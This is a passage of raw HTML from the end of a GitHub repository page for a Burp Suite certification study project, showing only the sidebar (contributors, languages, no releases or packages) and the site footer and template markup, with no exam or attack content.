  <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/releases" data-view-component="true" class="Link--primary no-underline Link">Releases</a></h2>

    <div class="text-small color-fg-muted">No releases published</div>

              </div>
            </div>

        
        
            <div class="BorderGrid-row">
              <div class="BorderGrid-cell">
                
  <h2 class="h4 mb-3">
  <a href="/users/botesjuan/packages?repo_name=Burp-Suite-Certified-Practitioner-Exam-Study" data-view-component="true" class="Link--primary no-underline Link d-flex flex-items-center">Packages
      <span title="0" hidden="hidden" data-view-component="true" class="Counter ml-1">0</span></a></h2>


      <div class="text-small color-fg-muted" >
        No packages published <br>
      </div>



              </div>
            </div>

        
        
            <div class="BorderGrid-row">
              <div class="BorderGrid-cell">
                <h2 class="h4 mb-3">
  <a href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/graphs/contributors" data-view-component="true" class="Link--primary no-underline Link d-flex flex-items-center">Contributors
      <span title="2" data-view-component="true" class="Counter ml-1">2</span></a></h2>


    
  <ul class="list-style-none ">
    <li class="mb-2 d-flex"
        >
      <a href="https://github.com/botesjuan"
          class="mr-2"
            data-hovercard-type="user" data-hovercard-url="/users/botesjuan/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self"
          
        >
        <img src="https://avatars.githubusercontent.com/u/52822072?s=64&amp;v=4" alt="@botesjuan" size="32" height="32" width="32" data-view-component="true" class="avatar circle" />
      </a>
      <span data-view-component="true" class="flex-self-center min-width-0 css-truncate css-truncate-overflow width-fit flex-auto">
        <a href="https://github.com/botesjuan" class="Link--primary no-underline flex-self-center">
          <strong>botesjuan</strong>
          <span class="color-fg-muted">Juan Botes</span>
        </a>
</span>    </li>
    <li class="mb-2 d-flex"
        >
      <a href="https://github.com/abh1ua"
          class="mr-2"
            data-hovercard-type="user" data-hovercard-url="/users/abh1ua/hovercard" data-octo-click="hovercard-link-click" data-octo-dimensions="link_type:self"
          
        >
        <img src="https://avatars.githubusercontent.com/u/103537925?s=64&amp;v=4" alt="@abh1ua" size="32" height="32" width="32" data-view-component="true" class="avatar circle" />
      </a>
      <span data-view-component="true" class="flex-self-center min-width-0 css-truncate css-truncate-overflow width-fit flex-auto">
        <a href="https://github.com/abh1ua" class="Link--primary no-underline flex-self-center">
          <strong>abh1ua</strong>
          <span class="color-fg-muted">A_UA2021</span>
        </a>
</span>    </li>
</ul>





              </div>
            </div>

        
        
            <div class="BorderGrid-row">
              <div class="BorderGrid-cell">
                <h2 class="h4 mb-3">Languages</h2>
<div class="mb-2">
  <span data-view-component="true" class="Progress">
    <span style="background-color:#3572A5 !important;;width: 93.4%;" itemprop="keywords" data-view-component="true" class="Progress-item color-bg-success-emphasis"></span>
    <span style="background-color:#f1e05a !important;;width: 6.6%;" itemprop="keywords" data-view-component="true" class="Progress-item color-bg-success-emphasis"></span>
</span></div>
<ul class="list-style-none">
    <li class="d-inline">
        <a class="d-inline-flex flex-items-center flex-nowrap Link--secondary no-underline text-small mr-3" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/search?l=python"  data-ga-click="Repository, language stats search click, location:repo overview">
          <svg style="color:#3572A5;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill mr-2">
    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
</svg>
          <span class="color-fg-default text-bold mr-1">Python</span>
          <span>93.4%</span>
        </a>
    </li>
    <li class="d-inline">
        <a class="d-inline-flex flex-items-center flex-nowrap Link--secondary no-underline text-small mr-3" href="/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/search?l=javascript"  data-ga-click="Repository, language stats search click, location:repo overview">
          <svg style="color:#f1e05a;" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill mr-2">
    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
</svg>
          <span class="color-fg-default text-bold mr-1">JavaScript</span>
          <span>6.6%</span>
        </a>
    </li>
</ul>

              </div>
            </div>

              </div>
</div>
  
</div></div>

  </div>


  </div>

</turbo-frame>


    </main>
  </div>

  </div>

          <footer class="footer pt-8 pb-6 f6 color-fg-muted p-responsive" role="contentinfo" >
  <h2 class='sr-only'>Footer</h2>

  


  <div class="d-flex flex-justify-center flex-items-center flex-column-reverse flex-lg-row flex-wrap flex-lg-nowrap">
    <div class="d-flex flex-items-center flex-shrink-0 mx-2">
      <a aria-label="GitHub Homepage" class="footer-octicon mr-2" href="https://github.com">
        <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-mark-github">
    <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"></path>
</svg>
</a>
      <span>
        &copy; 2025 GitHub,&nbsp;Inc.
      </span>
    </div>

    <nav aria-label="Footer">
      <h3 class="sr-only" id="sr-footer-heading">Footer navigation</h3>

      <ul class="list-style-none d-flex flex-justify-center flex-wrap mb-2 mb-lg-0" aria-labelledby="sr-footer-heading">

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to Terms&quot;,&quot;label&quot;:&quot;text:terms&quot;}" href="https://docs.github.com/site-policy/github-terms/github-terms-of-service" data-view-component="true" class="Link--secondary Link">Terms</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to privacy&quot;,&quot;label&quot;:&quot;text:privacy&quot;}" href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement" data-view-component="true" class="Link--secondary Link">Privacy</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to security&quot;,&quot;label&quot;:&quot;text:security&quot;}" href="https://github.com/security" data-view-component="true" class="Link--secondary Link">Security</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to status&quot;,&quot;label&quot;:&quot;text:status&quot;}" href="https://www.githubstatus.com/" data-view-component="true" class="Link--secondary Link">Status</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to community&quot;,&quot;label&quot;:&quot;text:community&quot;}" href="https://github.community/" data-view-component="true" class="Link--secondary Link">Community</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to docs&quot;,&quot;label&quot;:&quot;text:docs&quot;}" href="https://docs.github.com/" data-view-component="true" class="Link--secondary Link">Docs</a>
          </li>

          <li class="mx-2">
            <a data-analytics-event="{&quot;category&quot;:&quot;Footer&quot;,&quot;action&quot;:&quot;go to contact&quot;,&quot;label&quot;:&quot;text:contact&quot;}" href="https://support.github.com?tags=dotcom-footer" data-view-component="true" class="Link--secondary Link">Contact</a>
          </li>

          <li class="mx-2" >
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;cookies&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;cookies_link_subfooter_footer&quot;}"
    >
       Manage cookies
    </button>
  </cookie-consent-link>
</li>

<li class="mx-2">
  <cookie-consent-link>
    <button
      type="button"
      class="Link--secondary underline-on-hover border-0 p-0 color-bg-transparent text-left"
      data-action="click:cookie-consent-link#showConsentManagement"
      data-analytics-event="{&quot;location&quot;:&quot;footer&quot;,&quot;action&quot;:&quot;dont_share_info&quot;,&quot;context&quot;:&quot;subfooter&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;dont_share_info_link_subfooter_footer&quot;}"
    >
      Do not share my personal information
    </button>
  </cookie-consent-link>
</li>

      </ul>
    </nav>
  </div>
</footer>



    <ghcc-consent id="ghcc" class="position-fixed bottom-0 left-0" style="z-index: 999999"
      data-locale="en"
      data-initial-cookie-consent-allowed=""
      data-cookie-consent-required="false"
    ></ghcc-consent>




  <div id="ajax-error-message" class="ajax-error-message flash flash-error" hidden>
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <button type="button" class="flash-close js-ajax-error-dismiss" aria-label="Dismiss error">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
    </button>
    You cant perform that action at this time.
  </div>

    <template id="site-details-dialog">
  <details class="details-reset details-overlay details-overlay-dark lh-default color-fg-default hx_rsm" open>
    <summary role="button" aria-label="Close dialog"></summary>
    <details-dialog class="Box Box--overlay d-flex flex-column anim-fade-in fast hx_rsm-dialog hx_rsm-modal">
      <button class="Box-btn-octicon m-0 btn-octicon position-absolute right-0 top-0" type="button" aria-label="Close dialog" data-close-dialog>
        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x">
    <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z"></path>
</svg>
      </button>
      <div class="octocat-spinner my-6 js-details-dialog-spinner"></div>
    </details-dialog>
  </details>
</template>

    <div class="Popover js-hovercard-content position-absolute" style="display: none; outline: none;">
  <div class="Popover-message Popover-message--bottom-left Popover-message--large Box color-shadow-large" style="width:360px;">
  </div>
</div>

    <template id="snippet-clipboard-copy-button">
  <div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none m-2">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>
<template id="snippet-clipboard-copy-button-unpositioned">
  <div class="zeroclipboard-container">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn btn-invisible js-clipboard-copy m-2 p-0 d-flex flex-justify-center flex-items-center" data-copy-feedback="Copied!" data-tooltip-direction="w">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon">
    <path d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z"></path><path d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-fg-success d-none">
    <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"></path>
</svg>
    </clipboard-copy>
  </div>
</template>




    </div>
    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true" ></div>
    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
  </body>
</html>

